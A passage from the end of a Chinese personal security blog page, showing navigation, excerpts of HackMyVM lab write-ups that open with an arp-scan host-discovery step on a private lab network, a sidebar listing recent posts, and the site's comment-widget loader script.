等，负责将源代码编译成可执行文件或可部署的软件包。  自动化测试框架 如 JUnit、Selenium、Pytest...</div></div></div></a><a class="pagination-related" href="/2025/03/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Espo/" title="hackmyvm-Espo"><img class="cover" src="/img/essayhead/32.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm-Espo</div></div><div class="info-2"><div class="info-item-1">靶机地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24                                                          Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown:...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/18/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Espo/" title="hackmyvm-Espo"><img class="cover" src="/img/essayhead/32.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">hackmyvm-Espo</div></div><div class="info-2"><div class="info-item-1">靶机地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24                                                          Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown:...</div></div></div></a><a class="pagination-related" href="/2025/04/04/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Principle/" title="hackmyvm-Principle"><img class="cover" src="/img/essayhead/18.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">hackmyvm-Principle</div></div><div class="info-2"><div class="info-item-1"> 近况: 很难受、 也很累。 但是庆幸靶机很好 正值清明时节 清明时节雨纷纷 🌧️，路上行人欲断魂 😢。  靶机地址 信息收集主机发现  端口扫描  80端口仅仅是一个nginx 的欢迎界面而已  robots.txt的内容  hi.html的内容  hackme不存在  investigate的内容  根据提示对这个目录进行目录扫描   12345678910111213According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.Maybe that&#x27;s why I am a...</div></div></div></a><a class="pagination-related" href="/2025/02/24/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-buster/" title="hackmyvm-buster"><img class="cover" src="/img/essayhead/83.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-24</div><div class="info-item-2">hackmyvm-buster</div></div><div class="info-2"><div class="info-item-1">题目地址 信息收集主机发现 123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:b0:9b:6b      ...</div></div></div></a><a class="pagination-related" href="/2025/02/27/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-hero/" title="hackmyvm-hero"><img class="cover" src="/img/essayhead/72.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">hackmyvm-hero</div></div><div class="info-2"><div class="info-item-1">信息收集12345678910┌──(root㉿kali)-[/home/kali/Desktop/hackmyvm]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)192.168.56.100  08:00:27:43:9b:54       PCS Systemtechnik GmbH192.168.56.108  08:00:27:b9:ee:14       PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by...</div></div></div></a><a class="pagination-related" href="/2025/03/03/%E9%9D%B6%E6%9C%BA/hackmyvm/hackmyvm-Smol/" title="hackmyvm-Smol"><img class="cover" src="/img/essayhead/50.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-03</div><div class="info-item-2">hackmyvm-Smol</div></div><div class="info-2"><div class="info-item-1">信息收集123456789101112┌──(root㉿kali)-[/home/kali]└─# arp-scan -I eth1 192.168.56.0/24Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission deniedWARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission deniedStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.56.1    0a:00:27:00:00:10       (Unknown: locally administered)192.168.56.100  08:00:27:eb:ec:71      ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="artalk-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Yliken</div><div class="author-info-description">红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Yliken"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Yliken" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:largetlafonu71@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">他说你任何为人称道的美丽  不及他第一次遇到你</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/" title="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考"><img src="/img/essayhead/53.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考"/></a><div class="content"><a class="title" href="/2025/09/09/CVE/%E5%85%B3%E4%BA%8E%20CVE-2025-53547%E7%9A%84%E6%80%9D%E8%80%83/" title="CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考">CVE-2025-53547：Helm依赖更新代码注入漏洞分析及深度思考</a><time datetime="2025-09-08T16:00:00.000Z" title="发表于 2025-09-09 00:00:00">2025-09-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn"><img src="/img/essayhead/34.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Learn Pwn"/></a><div class="content"><a class="title" href="/2025/08/05/pwn/learn%20Pwn/" title="Learn Pwn">Learn Pwn</a><time datetime="2025-08-04T16:00:00.000Z" title="发表于 2025-08-05 00:00:00">2025-08-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto"><img src="/img/essayhead/83.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Motto"/></a><div class="content"><a class="title" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/" title="mazesec-Motto">mazesec-Motto</a><time datetime="2025-08-02T16:00:00.000Z" title="发表于 2025-08-03 00:00:00">2025-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp"><img src="/img/essayhead/39.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="mazesec-Temp"/></a><div class="content"><a class="title" href="/2025/07/30/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Temp/" title="mazesec-Temp">mazesec-Temp</a><time datetime="2025-07-29T16:00:00.000Z" title="发表于 2025-07-30 00:00:00">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现"><img src="/img/essayhead/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-39930复现"/></a><div class="content"><a class="title" href="/2025/07/28/CVE/cve-2024-39930/" title="CVE-2024-39930复现">CVE-2024-39930复现</a><time datetime="2025-07-27T16:00:00.000Z" title="发表于 2025-07-28 00:00:00">2025-07-28</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Yliken</div><div class="footer_custom_text">层楼终究误少年 自由早晚乱余生</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  let artalkItem = null
  const option = null
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'

  const destroyArtalk = () => {
    if (artalkItem) {
      artalkItem.destroy()
      artalkItem = null
    }
  }

  const artalkChangeMode = theme => artalkItem && artalkItem.setDarkMode(theme === 'dark')

  const initArtalk = (el = document, pageKey = location.pathname) => {
    artalkItem = Artalk.init({
      el: el.querySelector('#artalk-wrap'),
      server: 'https://www.yliken.top/',
      site: 'Yliken 的博客',
      darkMode: document.documentElement.getAttribute('data-theme') === 'dark',
      ...option,
      pageKey: isShuoshuo ? pageKey : (option && option.pageKey) || pageKey
    })

    if (GLOBAL_CONFIG.lightbox === 'null') return
    artalkItem.on('list-loaded', () => {
      artalkItem.ctx.get('list').getCommentNodes().forEach(comment => {
        const $content = comment.getRender().$content
        btf.loadLightbox($content.querySelectorAll('img:not([atk-emoticon])'))
      })
    })

    if (isShuoshuo) {
      window.shuoshuoComment.destroyArtalk = () => {
        destroyArtalk()
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }

    btf.addGlobalFn('pjaxSendOnce', destroyArtalk, 'destroyArtalk')
    btf.addGlobalFn('themeChange', artalkChangeMode, 'artalk')
  }

  const loadArtalk = async (el, pageKey) => {
    if (typeof Artalk === 'object') initArtalk(el, pageKey)
    else {
      await btf.getCSS('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.css')
      await btf.getScript('https://cdn.jsdelivr.net/npm/artalk/dist/Artalk.min.js')
      initArtalk(el, pageKey)
    }
  }

  if (isShuoshuo) {
    'Artalk' === 'Artalk'
      ? window.shuoshuoComment = { loadComment: loadArtalk }
      : window.loadOtherComment = loadArtalk
    return
  }

  if ('Artalk' === 'Artalk' || !false) {
    if (false) btf.loadComment(document.getElementById('artalk-wrap'), loadArtalk)
    else setTimeout(loadArtalk, 100)
  } else {
    window.loadOtherComment = loadArtalk
  }
})()</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>